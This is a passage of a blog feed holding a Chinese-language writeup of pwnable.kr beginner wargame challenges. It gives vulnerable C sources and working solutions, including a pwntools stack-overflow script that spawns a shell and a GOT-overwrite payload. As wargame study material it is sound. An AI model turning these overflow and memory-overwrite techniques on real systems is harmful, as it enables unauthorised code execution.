      &lt;p&gt;总体是根据这篇文章来的&lt;br&gt;&lt;a href=&quot;http://ju.outofmemory.cn/entry/130935&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ju.outofmemory.cn/entry/130935&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="hexo" scheme="https://www.aloxaf.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr - Toddler&#39;s Bottle 部分writeup</title>
    <link href="https://www.aloxaf.com/2018/05/pwnable.kr_Toddlers_Bottle/"/>
    <id>https://www.aloxaf.com/2018/05/pwnable.kr_Toddlers_Bottle/</id>
    <published>2018-05-04T02:19:12.000Z</published>
    <updated>2018-08-16T11:18:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Toddler&#39;s Bottle vey</p><p>包含了 Toddler&#39;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup.<br>(一看就知道还不会利用堆漏洞)</p><p>更: 又多了 blukat 和 horcruses......</p><a id="more"></a><h1 id="fd"><a href="#fd" class="headerlink" title="[fd]"></a>[fd]</h1><blockquote><p>Mommy! what is a file descriptor in Linux?</p><ul><li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:<br><a href="https://youtu.be/971eZhMHQQw" target="_blank" rel="noopener">https://youtu.be/971eZhMHQQw</a></li></ul><p>ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>ls可以看到三个文件, 其中flag文件无法直接读取(好像是废话...)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ls</span><br><span class="line">fd  fd.c  flag</span><br><span class="line">fd@ubuntu:~$ cat flag</span><br><span class="line">cat: flag: Permission denied</span><br></pre></td></tr></table></figure><p>flag.c 内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现获得flag的要求是传入n, 使得 read 从 n - 0x1234 读取字符串,</p><p>再判断该字符串是否与 LETMEWIN 相等</p><p>Google 一下获知以下内容</p><table><thead><tr><th>value</th><th>name</th></tr></thead><tbody><tr><td>0</td><td>stdin</td></tr><tr><td>1</td><td>stdout</td></tr><tr><td>2</td><td>stderr</td></tr></tbody></table><p>那么 n 应该为 0 + 0x1234 = 4660</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><p>flag 为 <code>mommy! I think I know what a file descriptor is!!</code></p><h1 id="collision"><a href="#collision" class="headerlink" title="[collision]"></a>[collision]</h1><blockquote><p>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!</p><p>ssh <a href="mailto:col@pwnable.kr" target="_blank" rel="noopener">col@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>col.c内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的目标是传入一个字符串 使得 check_password 的校验值为 0x21DD09EC</p><p>check_passcode 将传入的 char* 强制转换为 int* 再相加</p><p>一开始是想写脚本碰撞, 后来发现这个算法很简单, 完全可以手动构造一个</p><p>hashcode = 0x21DD09EC = 0x06C5CEC8*4 + 0x06C5CECC</p><p>只需要注意小端序与python版本, py3可能是默认编码是UTF-8的原因<br>直接使用Python3不好处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col@ubuntu:~$ ./col $(python2 -c &quot;print(&apos;\xc8\xce\xc5\x06&apos;*4+&apos;\xcc\xce\xc5\x06&apos;)&quot;)</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure><p>flag 为 <code>daddy! I just managed to create a hash collision :)</code></p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><blockquote><p>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?</p><p>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a></p><p>Running at : nc pwnable.kr 9000</p></blockquote><p>首先看看 bof.c 内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);   <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出点是 gets 函数</p><p>目标很简单, 一直溢出到 func 参数部分被 0xcafebabe 覆盖即可</p><p>看一下二进制文件, 确认是32位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; checksec --file bof</span><br><span class="line">[*] &apos;/home/zhonghua/writeup/pwnable.kr/bof&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>拖进 IDA , 反编译得知要覆盖 0x2c + 0x4 + 0x4 才到参数部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">func</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-889275714</span> )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nah.."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用 pwntools 写</p><p>在本地是毫无悬念地通过了, 然而远程服务器试了几次才过</p><p>比较迷</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'a'</span> * (<span class="number">0x2C</span> + <span class="number">0x8</span>), <span class="number">0xcafebabe</span>])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>flag为 <code>daddy, I just pwned a buFFer :)</code></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><blockquote><p>Papa brought me a packed present! let&#39;s open it.</p><p>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a></p><p>This is reversing task. all you need is binary</p></blockquote><p>二进制世家啊这是</p><p>file一下flag, 得知是64位ELF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; file flag</span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped</span><br></pre></td></tr></table></figure><p>chmod +x后执行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; chmod +x flag</span><br><span class="line">&gt; ./flag</span><br><span class="line">I will malloc() and strcpy the flag there. take it.</span><br></pre></td></tr></table></figure><p>但是这个文件 IDA 打开就只要三个函数, 完全看不懂在干嘛...</p><p>下断点在strcpy处也不行, 似乎是因为strip过的原因</p><p>在IDA各个视图间切换的的时候, 突然看到了Hex视图里有upx的字样,<br>仔细一看这个文件是upx压缩过的</p><p>那就没问题了, <code>upx -d</code> 解压文件</p><p>再拖入 IDA, 发现flag是以明文存储, 直接复制</p><p>得到 flag <code>UPX...? sounds like a delivery service :)</code></p><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><blockquote><p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p><p>ssh <a href="mailto:passcode@pwnable.kr" target="_blank" rel="noopener">passcode@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>连上去ls一下 flag + 题目名 + 题目名.c 的熟悉配置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passcode1;</span><br><span class="line">    <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译一下, 果然有warning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passcode.c: In function ‘login’:</span><br><span class="line">passcode.c:9:8: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]</span><br><span class="line">  scanf(&quot;%d&quot;, passcode1);</span><br><span class="line">        ^</span><br><span class="line">passcode.c:14:15: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]</span><br><span class="line">         scanf(&quot;%d&quot;, passcode2);</span><br></pre></td></tr></table></figure><p>scanf 的参数没有取地址...这鬼知道我的数据被存到哪儿去了<br>Welcome 处可以溢出一个字节....然而并没有什么卵用, passcode1 和 passcode2 的值看起来完全没有办法改变</p><p>顺着以下思路</p><p>passcode的值没有变 -> 内容为随机值? -> 说随机也不准确, 内存中这个地方原来是什么就是什么 ->  原来这里是什么值? ->  !是name的值</p><p>因为</p><p>338150 = 0x000528E6 13371337 = 00CC07C9</p><p>那么只要将这两个数字以字符串形式输入就行了</p><p>于是 <code>python -c &#39;print &quot;\xE6\x28\x05\x00\xC9\x07\xCC\x00&quot;&#39;|./passcode</code></p><p>果不其然地失败了</p><p>仔细想想好像应该加在末尾才对, 试了试还是失败了</p><p>又想了想某些程序开了Canary,<br>除了代码中声明的那些变量可能还有Canary变量在buffer中</p><p>emm......还是把文件拖下来用IDA分析一下比较好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">welcome参数的栈结构      login函数的栈结构</span><br><span class="line">| 0x70 | name   |   |      |           |</span><br><span class="line">|      |        |   | 0x10 | passcode1 |</span><br><span class="line">| 0x0C | canary |   | 0x0C | passcode2 |</span><br><span class="line">| 0x00 | ebp    |   | 0x00 | ebp       |</span><br></pre></td></tr></table></figure><p>呆呆的.jpg</p><p>passcode2的位置是原先canary的位置, 那passcode2的值我似乎完全控制不了....</p><p>不过我可以控制 passcode1 的值, 再搭配没有取地址的 scanf 函数,<br>我就拥有了任意地址写的能力</p><p>然而经验不足还是不知道有这种能力能干啥</p><p>Google一番后了解到拥有任意地址写的能力以后我们可以改 PLT 表,<br>相当于 Hook 任意函数?</p><p>那么这个地方我们可以利用 name 让 passcode1 的值为PLT表中 printf 函数项的地址 0x0804A03C</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; readelf -r passcode</span><br><span class="line"></span><br><span class="line">重定位节 &apos;.rel.dyn&apos; 位于偏移量 0x388 含有 2 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">重定位节 &apos;.rel.plt&apos; 位于偏移量 0x398 含有 9 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0</span><br><span class="line">0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0</span><br><span class="line">0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>然后在这个地址写入调用system函数的汇编语句的位置 0x080485E3 = 134514147</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080485E3                 mov     dword ptr [esp], offset command ; &quot;/bin/cat flag&quot;</span><br><span class="line">.text:080485EA                 call    _system</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">passcode@ubuntu:~$ python -c &apos;print &quot;a&quot; * 96 + &quot;\x00\xA0\x04\x08&quot; + &quot;134514147&quot;&apos;|./passcode</span><br><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">enter passcode1 : Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><p>flag为 <code>Sorry mom.. I got confused about scanf usage :(</code></p><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><blockquote><p>Daddy, teach me how to use random value in programming!</p><p>ssh <a href="mailto:random@pwnable.kr" target="_blank" rel="noopener">random@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>先 <code>cat random.c</code> 看内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();    <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得flag的要求是我输入的 key 和 random 异或起来的值等于 0xdeadbeef</p><p>Google一下得知 rand() 在先前没有调用 srand(seed) 时, 会初始化随机数种子为1</p><p>那直接写个程序算一算 <code>rand()^0xdeadbeef</code> 是多少就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span 